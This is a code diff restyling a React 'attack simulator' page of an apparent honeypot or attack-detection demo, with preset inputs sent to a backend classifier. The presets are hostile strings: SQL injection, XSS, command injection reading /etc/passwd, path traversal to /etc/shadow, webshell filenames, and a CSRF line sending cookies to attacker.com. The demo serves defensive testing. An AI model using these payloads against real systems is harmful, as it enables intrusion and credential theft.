@@ -1,43 +1,22 @@
 import { useState, useEffect } from "react";
 import { sendAttack } from "../services/api";
+import { GlassContainer } from "./ui/GlassContainer";
+import { Crosshair, ShieldAlert, Cpu, Terminal, Zap, Info, Loader2 } from "lucide-react";
+import { motion, AnimatePresence } from "framer-motion";
 
 const DEMOS = {
-  sqli: [
-    "' OR 1=1 --",
-    "' UNION SELECT null, username, password FROM users --",
-    "' OR 'a'='a",
-    "'; DROP TABLE users; --",
-    "admin' --",
-    "1' OR '1'='1"
-  ],
-  xss: [
-    "<script>alert('XSS')</script>",
-    "<img src=x onerror=alert(1)>",
-    "<svg/onload=alert(1)>",
-    "<iframe src='javascript:alert(1)'></iframe>",
-    "<details open ontoggle=alert(1)>"
-  ],
-  bruteforce: ["admin123", "password", "123456", "root", "guest"],
-  command_injection: [
-    "whoami; ping -c 4 127.0.0.1",
-    "ls -la /var/www",
-    "cat /etc/passwd",
-    "uname -a",
-    "id; whoami"
-  ],
-  path_traversal: [
-    "../../../../etc/passwd",
-    "../../../windows/system32/cmd.exe",
-    "../../../../var/log/apache2/access.log",
-    "../../../../etc/shadow"
-  ],
-  file_upload_attack: ["shell.php", "backdoor.php", "exploit.py", "image.php.jpg"],
-  ddos_pattern: ["AAAAAA repeated spam", "rapid requests", "flood traffic", "connection spike"],
-  csrf: ["<form action='/transfer'>", "<img src='http://attacker.com/steal?c='+document.cookie>", "<iframe src='http://victim.com/delete_account'>"],
+  sqli: ["' OR 1=1 --", "' UNION SELECT null, username, password FROM users --", "' OR 'a'='a"],
+  xss: ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"],
+  bruteforce: ["admin123", "password", "root", "guest"],
+  command_injection: ["whoami; ping -c 4 127.0.0.1", "ls -la /var/www", "cat /etc/passwd"],
+  path_traversal: ["../../../../etc/passwd", "../../../windows/system32/cmd.exe"],
+  file_upload_attack: ["shell.php", "backdoor.php", "exploit.py"],
+  ddos_pattern: ["AAAAAA repeated flood", "rapid request sequence"],
+  csrf: ["<form action='/transfer'>", "<img src='http://attacker.com/steal?c='+document.cookie>"],
   jwt_attack: ["eyJhbGciOiJIUzI1Ni...", "eyJhbGciOiJub25l..."],
-  api_abuse: ["/api/login spam", "/api/users", "/api/admin", "/api/v1/debug"],
-  normal: ["login attempt", "GET /profile", "POST /feedback"],
-  suspicious: ["Click here to reset your compromised password", "Suspicious link.exe", "Unexpected redirect"]
+  api_abuse: ["/api/login spam", "/api/v1/debug"],
+  normal: ["GET /profile", "POST /feedback"],
+  suspicious: ["Click here to reset your compromised password", "Suspicious link.exe"]
 };
 
 export default function AttackSimulator() {
@@ -46,13 +25,9 @@ export default function AttackSimulator() {
   const [loading, setLoading] = useState(false);
   const [sessionId, setSessionId] = useState("");
 
-  // Initialize or retrieve session ID on mount
   useEffect(() => {
-    let id = localStorage.getItem("aegis_session_id");
-    if (!id) {
-      id = crypto.randomUUID();
-      localStorage.setItem("aegis_session_id", id);
-    }
+    let id = localStorage.getItem("aegis_session_id") || crypto.randomUUID();
+    localStorage.setItem("aegis_session_id", id);
     setSessionId(id);
   }, []);
 
@@ -66,13 +41,8 @@ export default function AttackSimulator() {
     setLoading(true);
     setResponse(null);
     try {
-      // Cinematic ML artificial delay
       await new Promise(r => setTimeout(r, 600));
-
-      const res = await sendAttack({
-        input: input,
-        source: sessionId || "anonymous"
-      });
+      const res = await sendAttack({ input, source: sessionId || "anonymous" });
       setResponse(res);
     } catch (err) {
       console.error(err);
@@ -81,259 +51,106 @@ export default function AttackSimulator() {
     }
   };
 
-  const getRiskDetails = (prediction) => {
-    switch (prediction) {
-      case "sqli": return { level: "CRITICAL", color: "var(--danger)" };
-      case "xss": return { level: "HIGH", color: "var(--warning)" };
-      case "bruteforce": return { level: "HIGH", color: "var(--accent-cyber)" };
-      case "command_injection": return { level: "CRITICAL", color: "var(--danger)" };
-      case "path_traversal": return { level: "HIGH", color: "var(--warning)" };
-      case "file_upload_attack": return { level: "HIGH", color: "var(--warning)" };
-      case "ddos_pattern": return { level: "CRITICAL", color: "var(--danger)" };
-      case "csrf": return { level: "MEDIUM", color: "var(--warning)" };
-      case "jwt_attack": return { level: "HIGH", color: "var(--warning)" };
-      case "api_abuse": return { level: "MEDIUM", color: "var(--warning)" };
-      case "suspicious": return { level: "MEDIUM", color: "var(--warning)" };
-      case "normal": return { level: "NONE", color: "var(--text-dim)" };
-      default: return { level: "UNKNOWN", color: "var(--primary)" };
-    }
-  };
-
-  const parseAiOutput = (text) => {
-    if (!text) return { risk: null, responseText: "No response", explanation: "" };
-    const riskMatch = text.match(/Risk:\s*([A-Za-z]+)/i);
-    const responseMatch = text.match(/Response:([\s\S]*?)(?=Explanation:|$)/i);
-    const explanationMatch = text.match(/Explanation:([\s\S]*)/i);
-
-    return {
-      risk: riskMatch ? riskMatch[1].toUpperCase() : null,
-      responseText: responseMatch ? responseMatch[1].trim() : text,
-      explanation: explanationMatch ? explanationMatch[1].trim() : ""
-    };
+  const getRiskColor = (type) => {
+    if (['sqli', 'command_injection', 'ddos_pattern'].includes(type)) return 'text-[var(--danger)]';
+    if (['xss', 'path_traversal', 'jwt_attack'].includes(type)) return 'text-[var(--warning)]';
+    return 'text-[var(--accent-cyber)]';
   };
 
   return (
-    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', paddingTop: '4rem', minHeight: '80vh', gap: '2rem' }}>
-      
-      <div style={{ textAlign: 'center', marginBottom: '1rem' }}>
-        <h1 style={{ color: 'var(--accent-cyber)', fontSize: '2.5rem', margin: 0, textTransform: 'uppercase', letterSpacing: '0.1em', textShadow: '0 0 10px rgba(0,255,198,0.3)' }}>
-          Attack Simulation Console
+    <div className="max-w-4xl mx-auto space-y-8 py-4">
+      <div className="text-center space-y-2">
+        <h1 className="text-3xl font-display font-bold text-[var(--text-main)] tracking-widest uppercase">
+          Neural Payload Deployment
         </h1>
-        <p style={{ color: 'var(--text-dim)', fontSize: '1.1rem', marginTop: '0.5rem' }}>
-          Deploy raw payloads directly into the neural defense grid
+        <p className="text-[var(--text-dim)] font-mono text-sm uppercase tracking-tighter">
+          Test the Sentinel Grid by injecting malicious behavior signatures.
         </p>
       </div>
 
-      <div className="cyber-card glow-border" style={{ width: '100%', maxWidth: '900px', display: 'flex', flexDirection: 'column', gap: '1.5rem', padding: '2.5rem' }}>
-        
-        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem' }}>
-          <label style={{ color: 'var(--text-main)', fontSize: '1rem', fontWeight: '600', letterSpacing: '0.05em' }}>
-            TARGET PAYLOAD
-          </label>
+      <GlassContainer className="p-8 space-y-6">
+        <div className="space-y-3">
+          <div className="flex items-center justify-between text-[var(--text-dim)] text-xs font-bold tracking-widest uppercase">
+            <label className="flex items-center gap-2">
+              <Zap className="w-3 h-3 text-[var(--accent-cyber)]" />
+              Target Payload Buffer
+            </label>
+            <span>UTF-8 ENCODING</span>
+          </div>
           <textarea
             value={input}
             onChange={(e) => setInput(e.target.value)}
-            placeholder="e.g., OR 1=1; DROP TABLE users;--"
-            style={{
-              width: '100%',
-              minHeight: '150px',
-              backgroundColor: 'rgba(0,0,0,0.3)',
-              border: '1px solid var(--border-color)',
-              borderRadius: '8px',
-              color: 'var(--text-main)',
-              fontFamily: 'monospace',
-              fontSize: '1rem',
-              padding: '1rem',
-              resize: 'vertical',
-              outline: 'none',
-              transition: 'all 0.3s ease'
-            }}
-            onFocus={(e) => {
-              e.target.style.borderColor = 'var(--accent-cyber)';
-              e.target.style.boxShadow = '0 0 12px rgba(0, 255, 198, 0.25), inset 0 0 8px rgba(0, 255, 198, 0.1)';
-            }}
-            onBlur={(e) => {
-              e.target.style.borderColor = 'var(--border-color)';
-              e.target.style.boxShadow = 'none';
-            }}
+            placeholder="Insert raw exploit payload..."
+            className="w-full min-h-[140px] bg-black/40 border border-[var(--border-color)] rounded-lg p-4 font-mono text-sm text-[var(--text-main)] outline-none focus:border-[var(--accent-cyber)]/50 focus:ring-1 focus:ring-[var(--accent-cyber)]/10 transition-all resize-none shadow-inner"
           />
         </div>
 
-        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '1rem', flexWrap: 'wrap', gap: '1rem' }}>
-          <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap' }}>
-            <button 
-              onClick={() => setInput(getRandomDemo("sqli"))}
-              style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
-              onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
-              onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
-            >
-              Demo SQLi
-            </button>
-            <button 
-              onClick={() => setInput(getRandomDemo("xss"))}
-              style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
-              onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
-              onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
-            >
-              Demo XSS
-            </button>
-            <button 
-              onClick={() => setInput(getRandomDemo("bruteforce"))}
-              style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
-              onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
-              onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
-            >
-              Demo Brute
-            </button>
-            <button 
-              onClick={() => setInput(getRandomDemo("command_injection"))}
-              style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
-              onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
-              onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
-            >
-              Demo CMD
-            </button>
-            <button 
-              onClick={() => setInput(getRandomDemo("path_traversal"))}
-              style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
-              onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
-              onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
-            >
-              Demo Path
-            </button>
-            <button 
-              onClick={() => setInput(getRandomDemo("file_upload_attack"))}
-              style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
-              onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
-              onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
-            >
-              Demo Upload
-            </button>
-            <button 
-              onClick={() => setInput(getRandomDemo("ddos_pattern"))}
-              style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
-              onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
-              onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
-            >
-              Demo DDoS
-            </button>
-            <button 
-              onClick={() => setInput(getRandomDemo("csrf"))}
-              style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
-              onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
-              onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
-            >
-              Demo CSRF
-            </button>
-            <button 
-              onClick={() => setInput(getRandomDemo("jwt_attack"))}
-              style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
-              onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
-              onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
-            >
-              Demo JWT
-            </button>
-            <button 
-              onClick={() => setInput(getRandomDemo("api_abuse"))}
-              style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
-              onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
-              onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
-            >
-              Demo API
-            </button>
-            <button 
-              onClick={() => setInput(getRandomDemo("normal"))}
-              style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
-              onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
-              onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
-            >
-              Demo Normal
-            </button>
-            <button 
-              onClick={() => setInput(getRandomDemo("suspicious"))}
-              style={{ padding: '0.5rem 1rem', background: 'transparent', border: '1px solid var(--border-color)', borderRadius: '6px', color: 'var(--text-dim)', cursor: 'pointer', transition: 'all 0.2s', fontSize: '0.875rem', fontWeight: '500' }}
-              onMouseOver={(e) => { e.target.style.color = 'var(--text-main)'; e.target.style.borderColor = 'var(--text-dim)'; }}
-              onMouseOut={(e) => { e.target.style.color = 'var(--text-dim)'; e.target.style.borderColor = 'var(--border-color)'; }}
-            >
-              Demo Suspicious
-            </button>
+        <div className="space-y-4 pt-2">
+          <div className="text-[var(--text-dim)] text-[10px] font-bold tracking-widest uppercase flex items-center gap-2 px-1">
+            <Info className="w-3 h-3" />
+            Neural Injection Presets
           </div>
-
-          <button 
-            onClick={handleAttack}
-            disabled={loading || !input.trim()}
-            style={{ 
-              padding: '0.75rem 2rem', 
-              background: loading || !input.trim() ? 'var(--border-color)' : 'var(--danger)', 
-              border: 'none', 
-              borderRadius: '6px', 
-              color: loading || !input.trim() ? 'var(--text-dim)' : '#fff', 
-              fontWeight: 'bold', 
-              textTransform: 'uppercase', 
-              letterSpacing: '0.05em', 
-              cursor: loading || !input.trim() ? 'not-allowed' : 'pointer',
-              boxShadow: loading || !input.trim() ? 'none' : '0 0 15px rgba(255, 77, 77, 0.4)',
-              transition: 'all 0.2s',
-              display: 'flex',
-              alignItems: 'center',
-              gap: '0.75rem'
-            }}
-            onMouseOver={(e) => { 
-              if (!loading && input.trim()) {
-                e.target.style.transform = 'scale(1.02)'; 
-                e.target.style.boxShadow = '0 0 20px rgba(255, 77, 77, 0.6)'; 
-              }
-            }}
-            onMouseOut={(e) => { 
-              if (!loading && input.trim()) {
-                e.target.style.transform = 'scale(1)'; 
-                e.target.style.boxShadow = '0 0 15px rgba(255, 77, 77, 0.4)'; 
-              }
-            }}
-          >
-            {loading ? (
-              <>
-                <span className="loader" style={{ width: '1rem', height: '1rem', borderWidth: '2px', borderTopColor: 'var(--text-main)' }}></span>
-                Analyzing...
-              </>
-            ) : "Deploy Payload"}
-          </button>
+          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
+            {Object.keys(DEMOS).map(type => (
+              <button
+                key={type}
+                onClick={() => setInput(getRandomDemo(type))}
+                className="px-4 py-3 rounded-lg bg-[var(--surface-high)]/40 border border-[var(--border-color)] text-[var(--text-dim)] text-[11px] font-mono hover:text-[var(--accent-cyber)] hover:border-[var(--accent-cyber)]/40 hover:bg-[var(--accent-cyber)]/5 transition-all uppercase text-center truncate tracking-tighter"
+              >
+                {type.replace('_', ' ')}
+              </button>
+            ))}
+          </div>
         </div>
 
-      </div>
-
-      {/* Response Panel - Compromised System Output */}
-      {response && response.ai_output && typeof response.ai_output === 'string' && (
-        <div 
-          className="cyber-card transition-enter" 
-          style={{ width: '100%', maxWidth: '900px', borderLeft: `4px solid ${getRiskDetails(response.attack_type).color}`, animation: 'fadeIn 0.4s ease-out', padding: '1.5rem', background: '#0a0a0c' }}
+        <button
+          onClick={handleAttack}
+          disabled={loading || !input.trim()}
+          className={`w-full py-5 rounded-xl flex items-center justify-center gap-4 font-display font-bold text-sm tracking-[0.3em] uppercase transition-all overflow-hidden relative group mt-4 ${
+            loading || !input.trim()
+              ? 'bg-[var(--surface-high)]/50 text-[var(--text-dim)] cursor-not-allowed border border-[var(--border-color)]'
+              : 'bg-[var(--danger)] text-black shadow-[0_0_25px_rgba(255,77,77,0.3)] hover:shadow-[0_0_35px_rgba(255,77,77,0.6)] active:scale-[0.98]'
+          }`}
         >
-          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem', borderBottom: '1px solid rgba(255,255,255,0.05)', paddingBottom: '0.75rem' }}>
-            <span style={{ color: 'var(--text-dim)', fontSize: '0.75rem', fontWeight: 'bold', textTransform: 'uppercase', letterSpacing: '0.1em' }}>
-              System_Output_Stream // {response.attack_type.toUpperCase()}
-            </span>
-            <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: getRiskDetails(response.attack_type).color, boxShadow: `0 0 8px ${getRiskDetails(response.attack_type).color}` }}></div>
-          </div>
+          {loading ? (
+            <Loader2 className="w-5 h-5 animate-spin" />
+          ) : (
+            <>
+              <Crosshair className="w-5 h-5 group-hover:rotate-90 transition-transform duration-500" />
+              Deploy Packet
+            </>
+          )}
+        </button>
+      </GlassContainer>
 
-          <pre style={{ 
-            margin: 0,
-            whiteSpace: 'pre-wrap', 
-            fontFamily: 'monospace', 
-            color: '#d1d1d1', 
-            fontSize: '1rem', 
-            lineHeight: '1.5',
-            padding: '1rem', 
-            background: 'rgba(0,0,0,0.4)', 
-            borderRadius: '4px',
-            border: '1px solid rgba(255,255,255,0.03)',
-            maxHeight: '400px',
-            overflowY: 'auto'
-          }}>
-            {response.ai_output}
-          </pre>
-        </div>
-      )}
-      
+      <AnimatePresence>
+        {response && (
+          <motion.div
+            initial={{ opacity: 0, y: 10 }}
+            animate={{ opacity: 1, y: 0 }}
+            exit={{ opacity: 0, y: 10 }}
+          >
+            <GlassContainer className="overflow-hidden border-t-2 border-t-[var(--danger)]">
+              <div className="flex items-center justify-between px-6 py-3 bg-[var(--surface-high)]/50 border-b border-[var(--border-color)]">
+                <div className="flex items-center gap-3">
+                  <Cpu className="w-4 h-4 text-[var(--accent-cyber)]" />
+                  <span className="text-[10px] text-[var(--text-dim)] font-mono tracking-widest uppercase leading-none mt-0.5">
+                    Honeypot Response Stream
+                  </span>
+                </div>
+                <div className={`text-[10px] font-bold tracking-tighter ${getRiskColor(response.attack_type)}`}>
+                  {response.attack_type.toUpperCase()} INTERCEPTED
+                </div>
+              </div>
+              <div className="p-6">
+                <pre className="font-mono text-xs leading-relaxed text-[var(--text-main)] bg-black/30 p-4 rounded border border-[var(--border-color)] overflow-x-auto whitespace-pre-wrap min-h-[100px]">
+                  {response.ai_output}
+                </pre>
+              </div>
+            </GlassContainer>
+          </motion.div>
+        )}
+      </AnimatePresence>
     </div>
   );
 }
